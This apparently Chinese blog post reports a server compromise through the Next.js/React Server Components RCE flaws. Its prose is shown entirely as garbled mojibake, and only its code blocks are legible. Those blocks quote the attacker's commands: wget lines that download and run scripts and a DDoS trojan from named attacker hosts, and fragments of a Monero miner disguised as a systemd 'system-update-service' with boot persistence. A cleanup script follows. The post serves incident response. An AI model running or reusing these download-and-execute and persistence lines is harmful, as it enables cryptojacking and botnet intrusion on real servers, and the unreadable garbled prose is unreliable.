<p>ç„¶ååœ¨å½“æ™šï¼Œè…¾è®¯äº‘å°±ç»™æˆ‘å‘äº†ç¬¬äºŒæ¡é€šçŸ¥ï¼Œè¯´æ˜¯æˆ‘çš„æœåŠ¡å™¨ä¸Šæ£€æµ‹åˆ°å­˜åœ¨æ¶æ„æ–‡ä»¶ï¼Œæ˜¾ç„¶æ˜¯ä¸€ä¸ªæŒ–çŸ¿ç¨‹åºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09048a2b5de241ac8a055f8e5890974e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=NZM5LfGsaX4kJq3lC9AAFRSWCDY%3D" alt="" loading="lazy"/></p>
<p>ä½†å¾ˆé—æ†¾çš„æ˜¯ï¼Œæ˜¨å¤©æˆ‘æ­£åœ¨è€å®¶å¤„ç†äº‹æƒ…ï¼Œæ²¡æ¥å¾—åŠçœ‹åˆ°è¿™äº›é€šçŸ¥ï¼Œè€Œä¸”å¯æ°”çš„æ˜¯ï¼Œæ”»å‡»è€…ä¸“æŒ‘å‘¨äº”ä¸‹ç­æ—¶é—´ä½œæ¡ˆï¼Œæ‰€ä»¥æˆ‘å›¢é˜ŸåŒå­¦ä¹Ÿæ²¡æ³¨æ„ã€‚</p>
<p>ç­‰åˆ°ä»Šå¤©æ—©ä¸Šä¸€ççœ¼ï¼Œå‘ç°ç«™å†…ä¿¡å…¨æ˜¯å‘Šè­¦ï¼Œæ”»å‡»è€…åœ¨æ—©ä¸Š 6 ç‚¹å’Œ 9 ç‚¹åˆè¿›è¡Œäº†å‡ æ¬¡è¡ŒåŠ¨ã€‚è¿™æ—¶æˆ‘ä»¬å›¢é˜Ÿç¾¤é‡Œä¹Ÿå·²ç»ç‚¸é”…äº†ï¼Œå¤§å®¶å°±ä¸€èµ·æ’æŸ¥å¤„ç†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33b06af7ed3e4b338d1d887e3d61dcf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=7VoMsBafEpj6NI%2FYXachZl3gu0s%3D" alt="" loading="lazy"/></p>
<p>é¦–å…ˆæˆ‘æŸ¥çœ‹äº†å‰ç«¯é¡¹ç›®çš„ä¾èµ–ç®¡ç†æ–‡ä»¶ <code>package.json</code>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
Â <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
Â  Â <span class="hljs-attr">"next"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"15.3.3"</span>
<span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å‘ç°æˆ‘ç¼–ç¨‹å¯¼èˆªè®­ç»ƒè¥é¡¹ç›®ä½¿ç”¨çš„ Next.js ç‰ˆæœ¬ï¼ˆ15.3.3ï¼‰æ­£å¥½åœ¨æ¼æ´å½±å“èŒƒå›´å†…ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99e72f646e704171ae79b3772dbf4442~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=6iS8PYDsobTLsD2408TwO%2BnuBNU%3D" alt="" loading="lazy"/></p>
<p>ç„¶åæˆ‘æŸ¥çœ‹äº†åº”ç”¨æ—¥å¿— <code>camp_codefather_cn.log</code>ï¼Œå‘ç°äº†å¾ˆå¤šçº¿ç´¢ï¼Œå¹¶é…åˆè…¾è®¯äº‘ä¸»æœºå®‰å…¨æä¾›çš„å‘Šè­¦åˆ†æï¼Œè¿˜åŸäº†æ”»å‡»è€…çš„å®Œæ•´ä½œæ¡ˆè¿‡ç¨‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/096885d90f6344a0985c55c44a8fa01b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=sGDgP76byMVx5pWBauGN%2BKo13Zk%3D" alt="" loading="lazy"/></p>
<p>æ—¶é—´çº¿å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">ğŸ“…</span> <span class="hljs-number">2025-12-05 19:59:42</span> <span class="hljs-string">ã€ç¬¬ä¸€æ³¢æ”»å‡»ã€‘ä¸‹è½½æ¶æ„è„šæœ¬</span>
<span class="hljs-string">ğŸ“…</span> <span class="hljs-number">2025-12-05 20:04:00</span> <span class="hljs-string">ã€ç¬¬äºŒæ³¢æ”»å‡»ã€‘éƒ¨ç½²æŒ–çŸ¿ç¨‹åº</span>
<span class="hljs-string">ğŸ“…</span> <span class="hljs-number">2025-12-06 06:13:43</span> <span class="hljs-string">ã€ç¬¬ä¸‰æ³¢æ”»å‡»ã€‘æ¤å…¥</span> <span class="hljs-string">DDoS</span> <span class="hljs-string">æœ¨é©¬</span>
<span class="hljs-string">ğŸ“…</span> <span class="hljs-number">2025-12-06 09:29:33</span> <span class="hljs-string">ã€ç¬¬å››æ³¢æ”»å‡»ã€‘è¿è¡Œå†…å­˜æœ¨é©¬</span>
<span class="hljs-string">ğŸ“…</span> <span class="hljs-number">2025-12-06 09:42:00</span> <span class="hljs-string">ã€æŒç»­æ”»å‡»ã€‘å°è¯•å»ºç«‹åé—¨</span>
</code></pre>
<h4 data-id="heading-1">1ã€ä¸‹è½½æ¶æ„è„šæœ¬ï¼Œéƒ¨ç½²æŒ–çŸ¿ç¨‹åº</h4>
<p>é¦–å…ˆæ™šä¸Š 7 ç‚¹ 59 åˆ†ï¼Œæ”»å‡»è€…åˆ©ç”¨ Next.js RSC æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„ HTTP POST è¯·æ±‚ï¼Œæ‰§è¡Œå‘½ä»¤ä¸‹è½½äº†æ¶æ„è„šæœ¬ <code>sex.sh</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">wgetÂ http://vps-zap812595-1.zap-srv.com:3000/sex.shÂ -OÂ sex.sh
<span class="hljs-built_in">chmod</span>Â +x sex.sh
./sex.sh
</code></pre>
<p>æ—¥å¿—è®°å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">--2025-12-05 19:59:42-- http://vps-zap812595-1.zap-srv.com:3000/sex.sh
Resolving vps-zap812595-1.zap-srv.com (vps-zap812595-1.zap-srv.com)... 45.146.252.37
Connecting to vps-zap812595-1.zap-srv.com (vps-zap812595-1.zap-srv.com)|45.146.252.37|:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1619 (1.6K) [text/x-sh]
Saving to: <span class="hljs-string">'sex.sh'</span>
â€‹
2025-12-05 19:59:42 (148 MB/s) - <span class="hljs-string">'sex.sh'</span> saved [1619/1619]
</code></pre>
<p>ä»è¿™é‡Œèƒ½çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™æ”»å‡»è€…å·²ç»å¯ä»¥é€šè¿‡ Next.js çš„æ¼æ´ä¸ºæ‰€æ¬²ä¸ºäº†ï¼</p>
<p>æˆ‘ä¸‹è½½äº†è¿™ä¸ª <code>sex.sh</code> è„šæœ¬æ–‡ä»¶ï¼Œå¸¦å¤§å®¶ â€œé‰´èµä¸€ä¸‹â€ã€‚</p>
<p>é¦–å…ˆæ”»å‡»è€…é…ç½®äº†æŒ–çŸ¿å‚æ•°ï¼Œè¿æ¥åˆ°æ”»å‡»è€…çš„çŸ¿æ± ã€ä½¿ç”¨æ”»å‡»è€…çš„é—¨ç½—å¸é’±åŒ…ï¼Œå¹¶ä¼ªè£…æˆç³»ç»Ÿæ›´æ–°æœåŠ¡ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ARGS</span>=<span class="hljs-string">"--url pool.hashvault.pro:443 --user 89ASvi6ZBHXE6y...ï¼ˆæ”»å‡»è€…çš„é’±åŒ…åœ°å€ï¼‰"</span>
<span class="hljs-attr">SERVICE_NAME</span>=<span class="hljs-string">"system-update-service"</span>Â Â <span class="hljs-comment"># âš ï¸ ä¼ªè£…æˆç³»ç»ŸæœåŠ¡</span>
</code></pre>
<p>ç„¶åä¼ªè£…æˆæµè§ˆå™¨è¯·æ±‚ï¼Œä» GitHub ä¸‹è½½åˆæ³•çš„ XMRig æŒ–çŸ¿è½¯ä»¶</p>
<pre><code class="hljs language-ruby" lang="ruby">curlÂ -LÂ -oÂ kal.tar.gz \
Â --user-agentÂ <span class="hljs-string">"Mozilla/5.0..."</span>Â \ Â <span class="hljs-comment"># âš ï¸ ä¼ªè£…æˆæµè§ˆå™¨</span>
<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/xmrig</span><span class="hljs-regexp">/xmrig/releases</span><span class="hljs-regexp">/download/v</span>6.<span class="hljs-number">24.0</span>/xmrig-<span class="hljs-number">6.24</span>.<span class="hljs-number">0</span>-linux-static-x64.tar.gz
tar xvzf kal.tar.gz
</code></pre>
<p>æ¥ä¸‹æ¥åˆ›å»ºç³»ç»ŸæœåŠ¡ï¼Œè®¾ç½®å¼€æœºè‡ªå¯ã€è¿›ç¨‹å´©æºƒåè‡ªåŠ¨é‡å¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å³ä½¿é‡å¯æœåŠ¡å™¨ï¼Œæœ¨é©¬ä¾ç„¶è¿è¡Œ</strong>ï¼</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åˆ›å»º systemd æœåŠ¡</span>
catÂ &gt; /etc/systemd/system/system-update-service.service &lt;&lt;EOF
<span class="hljs-section">[Service]</span>
<span class="hljs-attr">ExecStart</span>=/path/to/xmrigÂ --urlÂ pool.hashvault.pro:<span class="hljs-number">443</span> ...
<span class="hljs-attr">Restart</span>=always Â  Â  Â  Â Â <span class="hljs-comment"># âš ï¸ å´©æºƒåè‡ªåŠ¨é‡å¯</span>
<span class="hljs-section">[Install]</span>
<span class="hljs-attr">WantedBy</span>=multi-user.target Â <span class="hljs-comment"># âš ï¸ å¼€æœºè‡ªå¯</span>
EOF
â€‹
systemctl enable system-update-service
systemctlÂ startÂ system-update-service
</code></pre>
<p>å¦‚æœæ²¡æœ‰ root æƒé™ï¼Œä¼šåœ¨åå°è¿è¡ŒæŒ–çŸ¿ç¨‹åºï¼Œå¹¶é‡å®šå‘è¾“å‡ºåˆ° <code>/dev/null</code>ï¼Œä¸ç•™æ—¥å¿—ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">nohup</span> /path/to/xmrigÂ <span class="hljs-variable">$ARGS</span>Â &gt;/dev/nullÂ 2&gt;&amp;1 &amp;
</code></pre>
<p>å®Œæ•´ä»£ç æˆ‘åˆ†äº«åˆ° <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.codecopy.cn%2Fpost%2Fmr29su" target="_blank" title="https://www.codecopy.cn/post/mr29su" ref="nofollow noopener noreferrer">ä»£ç å°æŠ„</a> äº†ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥é˜…è¯»ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/357155e3e2b74225aabdda6e5d8ff921~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=c9eLQB8fuu7vB0KDfg8n8rRwd%2FA%3D" alt="" loading="lazy"/></p>
<p>æˆ‘éƒ½å¿ä¸ä½èµç¾æ”»å‡»è€…äº†ï¼Œè¿™ä¸ªç¨‹åºå†™å¾—çœŸä¸é”™ï¼ŒçŸ­å°å‡ç»ƒï¼Œä¸ä»…æœ‰éšè”½å’Œä¼ªè£…ã€è¿˜è€ƒè™‘åˆ°äº†æŒä¹…åŒ–å’Œé™çº§ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c123db69d8c3403cb32a840ec2338a48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=IeAShT4QYwpgfZ8bNs80anRpSDg%3D" alt="" loading="lazy"/></p>
<p>è¿™æ®µä»£ç æ‰§è¡Œå®Œï¼Œæˆ‘çš„æœåŠ¡å™¨å°±å·²ç»è„äº†ï¼ŒæŒ–çŸ¿ç¨‹åºå¼€å§‹åœ¨åå°è¿è¡Œï¼ŒæŒç»­æ¶ˆè€—æˆ‘çš„æœåŠ¡å™¨èµ„æºä¸ºæ”»å‡»è€…æŒ–å–é—¨ç½—å¸ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0cbf029491804ee5b0ef5e0850281364~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=pvk2%2F48Sn161tgttSgSvaefZJV4%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-2">2ã€æ¤å…¥ DDoS æœ¨é©¬</h4>
<p>ç„¶åæ˜¯ç¬¬äºŒå¤©æ—©ä¸Š 6 ç‚¹å¤šï¼Œæ”»å‡»è€…ä¸è®²æ­¦å¾·ï¼Œç»™æˆ‘çš„æœåŠ¡å™¨æ¤å…¥äº†ç¬¬äºŒä¸ªæ¶æ„ç¨‹åºã€‚</p>
<p>å…ˆçœ‹çœ‹æ—¥å¿—è®°å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">--2025-12-06 06:13:43-- http://res.qiqigece.top/nginx2
Resolving res.qiqigece.top (res.qiqigece.top)... 154.38.121.219
Connecting to res.qiqigece.top (res.qiqigece.top)|154.38.121.219|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1371145 (1.3M) [application/octet-stream]
Saving to: <span class="hljs-string">'/tmp/nginx3'</span>
â€‹
2025-12-06 06:13:43 (6.32 MB/s) - <span class="hljs-string">'/tmp/nginx3'</span> saved [1371145/1371145]
</code></pre>
<p>æ”»å‡»è€…é€šè¿‡ wget ä¸‹è½½äº†ä¸€ä¸ªç‰¹åˆ¶çš„ Nginx ç½‘ç«™æœåŠ¡å™¨æ–‡ä»¶ï¼Œè¿˜ç‰¹æ„é€‰æ‹©äº†æƒé™å®½æ¾çš„ <code>/tmp</code> ç›®å½•ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">wgetÂ -OÂ /tmp/nginx3 http://res.qiqigece.top/nginx2
<span class="hljs-built_in">chmod</span>Â 777Â /tmp/nginx3
/tmp/nginx3
</code></pre>
<p>æ ¹æ®å®‰å…¨æŠ¥å‘Šï¼Œè¿™æ˜¯ä¸€ä¸ª DDoS æ”»å‡»æœ¨é©¬ç±»çš„æ¶æ„ç¨‹åºï¼Œå¯ä»¥æŠŠæˆ‘çš„æœåŠ¡å™¨å˜æˆå¤ªç¾çš„ â€œè‚‰é¸¡â€ï¼Œå‚ä¸å¯¹å…¶ä»–æœåŠ¡å™¨çš„ DDoS æ”»å‡»ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62ae0753b5df4a4880dcc69dd254388d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=ESUqz5CRf%2Bs%2FNHW8U7Hu6qbseoI%3D" alt="" loading="lazy"/></p>
<p>ä¸ä»…ä¼šæ¶ˆè€—æœåŠ¡å™¨çš„å¸¦å®½ï¼Œè¿˜å¯èƒ½å¯¼è‡´æˆ‘çš„æœåŠ¡å™¨ IP è¢«å°ï¼›æ›´ä¸¥é‡çš„æ˜¯ï¼Œæˆ‘æœ‰å¯èƒ½ç›´æ¥å°±å‚ä¸ç½‘ç»œæ”»å‡»äº†ï¼Ÿï¼</p>
<p>è¿™éš¾é“å°±æ˜¯ä¼ è¯´ä¸­çš„äººåœ¨å®¶ä¸­åï¼Œé”…ä»å¤©ä¸Šæ¥ï¼Ÿ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84ded77a5c244090862086d1aded7bea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=WeosJ5vE%2Fp9T0sRnkzc2Z5rw0oo%3D" alt="" loading="lazy"/></p>
<p>6 ç‚¹æˆ‘ç‰¹ä¹ˆè¿˜åœ¨åºŠä¸Šèººç€æµå£æ°´åšæ¢¦å‘¢ï¼Œæ”»å‡»è€…åŠªåŠ›å¾—è®©äººå¿ƒç–¼å•Šï¼</p>
<h4 data-id="heading-3">3ã€æ¤å…¥å†…å­˜æœ¨é©¬</h4>
<p>åˆ°äº†æ—©ä¸Š 9 ç‚¹ 29 åˆ†ï¼Œæ”»å‡»è€…åˆå‘åŠ›äº† ï¼Œåˆç»™æˆ‘çš„æœåŠ¡å™¨æ¤å…¥äº†ä¸€ä¸ªæœ¨é©¬ç±»çš„æ¶æ„ç¨‹åº <code>/dev/shm/java</code>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0244e96daf24405a87a4637d3c8542e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=4uZJMsoYL7u7%2F8ZE6MwpelkVypo%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡æœ‰ç‚¹å„¿å¥‡æ€ªçš„æ˜¯ï¼Œè¿™æ¬¡çš„æ–‡ä»¶ç«Ÿç„¶å·²ç»è¢«åˆ é™¤æ‰äº†ï¼Ÿ</p>
<p>æˆ‘æ‰ä¸ç›¸ä¿¡æ”»å‡»è€…è‰¯å¿ƒå‘ç°å‘¢ï¼Œæˆ‘é€šè¿‡ä¸‹åˆ—å‘½ä»¤çœ‹äº†ä¸‹è¿›ç¨‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">ls</span>Â -lÂ /proc/*/exe |Â grepÂ deleted
</code></pre>
<p><strong>å‘ç°ç«Ÿç„¶æœ‰ 4 ä¸ªæœ¨é©¬è¿›ç¨‹åŒæ—¶è¿è¡Œï¼</strong></p>
<pre><code class="hljs language-bash" lang="bash">lrwxrwxrwx 1 www www 0 Dec 6 10:48 /proc/1659874/exe -&gt; /dev/shm/java (deleted)
lrwxrwxrwx 1 www www 0 Dec 6 10:48 /proc/1659875/exe -&gt; /dev/shm/java (deleted)
lrwxrwxrwx 1 www www 0 Dec 6 10:48 /proc/1659876/exe -&gt; /dev/shm/java (deleted)
lrwxrwxrwx 1 www www 0 Dec 6 10:48 /proc/1659877/exe -&gt; /dev/shm/java (deleted)
</code></pre>
<p>ç‹ å•Šï¼ŒçœŸç‹ å•Šï¼Œ1 ä¸ªè¿›ç¨‹è¿˜ä¸å¤Ÿæ˜¯å§ï¼Ÿ</p>
<p>æˆ‘çŒœ â€œåˆ é™¤æ–‡ä»¶â€ æ˜¯æ”»å‡»è€…ä¸ºäº† <strong>é˜²æ­¢å–è¯</strong>ï¼Œè®©æ–‡ä»¶è¿è¡Œåœ¨ Linux çš„å…±äº«å†…å­˜æ–‡ä»¶ç³»ç»Ÿ <code>/dev/shm</code> ä¸­ï¼Œå¹¶ä¸”æ•…æ„æŠŠæ–‡ä»¶åˆ é™¤æ‰ï¼Œè®© <code>ls</code>ã€<code>find</code> ç­‰å‘½ä»¤æ‰¾ä¸åˆ°å®ƒï¼Œä½†å…¶å®è¿›ç¨‹ä»ç„¶åœ¨ç»§ç»­è¿è¡Œï¼Œå¢åŠ äº†å–è¯æ’æŸ¥çš„éš¾åº¦ã€‚</p>
<h4 data-id="heading-4">4ã€æŒç»­æ¢æµ‹</h4>
<p>ä¸Šåˆ 9 ç‚¹ 42 åˆ†ï¼Œæ”»å‡»è€…åˆæ¥äº†ï¼Œè¿™æ¬¡æ˜¯ä»ä¸€ä¸ªæ³¢å…°çš„ IP åœ°å€ä¸‹è½½äº†ä¸€ä¸ªç¨‹åºï¼Œå¹¶èµ‹äºˆæé«˜çš„è®¿é—®æƒé™ï¼Œç„¶åè¿˜æƒ³è¿œç¨‹ä¸‹è½½å¹¶æ‰§è¡Œå¦å¤–ä¸€ä¸ªè¿œç¨‹è„šæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0219144d857440d9b02e1a15de1af32f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=kaoiBjR40xytpKcjTco5AfmnHcI%3D" alt="" loading="lazy"/></p>
<p>å¾ˆå¯æƒœæˆ‘çš„æœåŠ¡å™¨å¹¶æ²¡æœ‰ busyboxï¼ˆåµŒå…¥å¼ Linux å¸¸ç”¨çš„å·¥å…·é›†ï¼‰ï¼Œæ‰€ä»¥è¿™æ¬¡æ”»å‡»è¢«é˜»æ­¢äº†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/bin/sh: line 1: busybox: <span class="hljs-built_in">command</span> not found
<span class="hljs-built_in">chmod</span>: cannot access <span class="hljs-string">'x86'</span>: No such file or directory
/bin/sh: line 1: ./x86: No such file or directory
</code></pre>
<p>ä½†è¿™ä¹Ÿè¯´æ˜æ”»å‡»è€…åœ¨ <strong>æŒç»­å°è¯•</strong> å»ºç«‹å¤šé‡åé—¨ã€‚çœŸæ˜¯ä¸§å°½å¤©è‰¯ï¼Œä¸§å¿ƒç—…ç‹‚å•Šï¼</p>
<h2 data-id="heading-5">æ¼æ´ç®€ä»‹</h2>
<p>åˆ†äº«åˆ°è¿™é‡Œï¼Œæƒ³å¿…å¤§å®¶å·²ç»æ„Ÿå—åˆ°è¿™æ¬¡æ¼æ´çš„å±å®³äº†å§ã€‚</p>
<p>ä¸»è¦æ˜¯ 2 ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼š</p>
<ul>
<li>CVE-2025-55182ï¼šReact Server Components è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</li>
<li>CVE-2025-66478ï¼šNext.js App Router è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</li>
</ul>
<p>æ®å®˜æ–¹æè¿°ï¼Œåœ¨ React çš„æœåŠ¡å™¨ç»„ä»¶åº“ä¸­ï¼Œç”±äº React åœ¨è§£ç å‘é€è‡³æœåŠ¡å™¨å‡½æ•°ç«¯ç‚¹çš„è¯·æ±‚è´Ÿè½½æ—¶å­˜åœ¨å®‰å…¨ç¼ºé™·ï¼Œå¯¼è‡´æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡ <strong>å‘ä»»ä½•æœåŠ¡å™¨å‡½æ•°ç«¯ç‚¹å‘é€ç‰¹åˆ¶çš„æ¶æ„ HTTP è¯·æ±‚</strong>ï¼Œå½“è¯¥è¯·æ±‚è¢« React ååºåˆ—åŒ–å¤„ç†æ—¶ï¼Œå³å¯ <strong>åœ¨æœåŠ¡å™¨ä¸Šå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä»è€Œå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</strong></p>
<p>è¿™æ¬¡æ¼æ´çš„å½±å“èŒƒå›´å¾ˆå¤§ï¼ŒåŒ…æ‹¬ä½¿ç”¨äº† React æœåŠ¡å™¨ç»„ä»¶çš„åº”ç”¨ã€ä½¿ç”¨äº†ä¸å®‰å…¨ç‰ˆæœ¬çš„ Next.js åº”ç”¨ç­‰ç­‰ã€‚æ³¨æ„ï¼Œä¸ä»…ä»…æ˜¯ä½ è‡ªå·±å¼€å‘çš„åº”ç”¨ï¼Œå¦‚æœä½ æœåŠ¡å™¨ä¸Šå®‰è£…äº†å…¶ä»–ç¬¦åˆè¿™äº›ç‰¹å¾çš„åº”ç”¨ï¼Œä¸€æ ·ä¼šä¸­æ‹›ï¼<strong>æ”»å‡»è€…æ˜¯å¯ä»¥é€šè¿‡ç¨‹åºæ‰¹é‡æ‰«æè¿™äº›åº”ç”¨çš„ï¼Œå‘ç°ä¸€ä¸ªæ”»å‡»ä¸€ä¸ªã€‚</strong></p>
<p>ä½ çœ‹æ¼æ´æ˜¯å‰ä¸¤å¤©åˆšåˆšæŠ«éœ²çš„ï¼Œæˆ‘è¿™å°±ä¸­æ‹›äº†ã€‚æˆ‘ä»¬å›¢é˜Ÿçš„å°ä¼™ä¼´è‡ªå·±çš„æœåŠ¡å™¨ä¹Ÿä¸­æ‹›äº†ï¼Œä»–é€šè¿‡ä¸€ä¸ª <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMalayke%2FNext.js-RSC-RCE-Scanner-CVE-2025-66478" target="_blank" title="https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478" ref="nofollow noopener noreferrer">å¼€æºé¡¹ç›®</a> æˆåŠŸå¤ç°äº†æ”»å‡»ï¼Œåªéœ€è¦ä¸€ä¸ªè¯·æ±‚å°±èƒ½æ‰“å¼€æœåŠ¡å™¨ä¸Šçš„è®¡ç®—å™¨ç¨‹åºã€ç»™æœåŠ¡å™¨å†™å…¥ä»»ä½•æ–‡ä»¶ã€‚</p>
<blockquote>
<p>å¼€æºçš„æ‰«æå·¥å…·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMalayke%2FNext.js-RSC-RCE-Scanner-CVE-2025-66478" target="_blank" title="https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478" ref="nofollow noopener noreferrer">github.com/Malayke/Nexâ€¦</a></p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8a78f311873457084bf17daffb79ecb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=xN4Vk2GYnwGgfDYsJTlINZmux4E%3D" alt="" loading="lazy"/></p>
<p>å¥½å®¶ä¼™ï¼Œå‡ ä¹æ²¡æœ‰ä»»ä½•æˆæœ¬ï¼Œå°±èƒ½ä¸ºæ‰€æ¬²ä¸ºï¼Œæ¤å…¥åé—¨ã€ç”Ÿäº§åƒåœ¾ã€æ‹¿æ¥æŒ–çŸ¿ã€ç›—å–ä¿¡æ¯ï¼</p>
<p><strong>è€Œä¸”å¾ˆå¤šæœ‹å‹å¯èƒ½æ²¡æœ‰åŠæ—¶å‘ç°ã€æˆ–è€…ä¸çŸ¥é“æ€ä¹ˆå¤„ç†ï¼Œå°±ä¼šä¸€ç›´è¢«æ”»å‡»è€…å½“æˆçŸ¿å·¥æ¥åˆ©ç”¨ã€‚</strong></p>
<h2 data-id="heading-6">å¦‚ä½•å¤„ç†ï¼Ÿ</h2>
<p>å¦‚æœæ¡ä»¶å…è®¸çš„è¯ï¼Œå»ºè®®æ˜¯ç«‹åˆ»éš”ç¦»æœåŠ¡å™¨ï¼Œé˜²æ­¢è¢«æ”»å‡»è€…æ‹¿æ¥åˆ©ç”¨ã€æ¤å…¥æ›´å¤šæ¶æ„ç¨‹åºã€æˆ–è€…è·å–æ›´å¤šä¿¡æ¯ã€‚</p>
<p>ç„¶åé€šè¿‡ç¼–å†™ Linux è„šæœ¬æ¥æ¸…ç†æ¶æ„æ–‡ä»¶ï¼š</p>
<blockquote>
<p>æ³¨æ„ï¼Œä»¥ä¸‹è„šæœ¬ä»…ä¾›å‚è€ƒï¼Œå®é™…ä»¥æ“ä½œç³»ç»Ÿå’Œæ”»å‡»æƒ…å†µä¸ºä¸»ï¼Œç”¨ AI ç”Ÿæˆå³å¯</p>
</blockquote>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ é™¤æ•´ä¸ªæŒ–çŸ¿ç›®å½•</span>
<span class="hljs-built_in">rm</span>Â -rfÂ /www/wwwroot/xxx/xmrig-6.24.0/
<span class="hljs-built_in">rm</span>Â -fÂ /www/wwwroot/xxx/sex.sh
<span class="hljs-built_in">rm</span>Â -fÂ /www/wwwroot/xxx/kal.tar.gz
â€‹
<span class="hljs-comment"># åˆ é™¤ /tmp ä¸‹çš„æ¶æ„æ–‡ä»¶</span>
